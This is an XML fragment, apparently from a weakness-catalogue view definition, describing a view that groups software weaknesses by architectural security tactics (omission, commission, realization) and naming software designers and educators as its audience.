         <Objective>This view organizes weaknesses according to common architectural security tactics. It is intended to assist architects in identifying potential weaknesses when designing software. The top level categories in this view represent the individual tactics that are part of a secure-by-design approach to software development. The weaknesses that are members of each category contain information about how each is introduced relative to the software's architecture. Three different modes of introduction are used: Omission - caused by missing a security tactic when it is necessary. Commission - refers to incorrect choice of tactics which could result in undesirable consequences. Realization - appropriate security tactics are adopted but are incorrectly implemented.</Objective>
         <Audience>
            <Stakeholder>
               <Type>Software Designers</Type>
               <Description>Software designers may find this view useful as the weaknesses are organized by known security tactics, aiding the designer in imbedding security throughout the design process instead of discovering weaknesses after the software has been built.</Description>

            <Stakeholder>
               <Type>Educators</Type>
               <Description>Since Architectural Concepts covers weaknesses based on security tactics, educators may use this view as reference material when discussing security by design or architectural weaknesses.</Description>
